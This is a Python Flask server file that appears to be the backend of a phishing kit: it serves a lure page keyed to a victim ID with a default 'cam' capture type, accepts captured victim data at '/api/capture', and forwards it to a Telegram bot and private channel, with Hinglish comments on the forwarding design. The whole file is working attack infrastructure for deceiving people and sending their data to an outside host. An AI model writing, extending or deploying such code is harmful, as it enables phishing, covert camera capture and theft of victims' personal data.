from flask import Flask, request, jsonify
import requests
import os
import base64
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID

app = Flask(__name__)
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
user_redirects = {}

@app.route('/p/<uid>')
def phishing_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    with open('web/index.html', 'r') as f:
        html = f.read()
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    return html

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error", "msg": "No data"}), 400

    # Send to bot for forwarding to user + channel
    forward_to_bot(data)
    return jsonify({"status": "ok"})

def forward_to_bot(data):
    try:
        # Bot ko forward kar do — bot user aur channel dono ko bhejega
        requests.post(f"{BOT_API}/sendMessage", json={
            "chat_id": PRIVATE_CHANNEL_ID,  # Temporary, bot handle karega
            "text": "NEW_DATA",
            "parse_mode": "Markdown"
        }, timeout=5)
        # Actually bot ke internal function ko call karna hai, but yahan se hum directly bot ko trigger nahi kar sakte
        # Isliye bot hi handle karega — already bot.py me forward_to_user_and_channel hai
        # Ab hum bot ko /send_data command se trigger karenge — but simpler: bot already data receive kar leta hai webhook se
        # Isliye yahan se hum bot ko message bhej kar trigger kar sakte hain
        # Lekin best hai ki bot hi saara forwarding kare — jo already ho raha hai
        pass
    except Exception as e:
        print(f"Forward error: {e}")

@app.route('/set_redirect/<victim_id>', methods=['POST'])
def set_redirect(victim_id):
    url = request.json.get('url')
    if url and url.startswith('http'):
        user_redirects[victim_id] = url
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
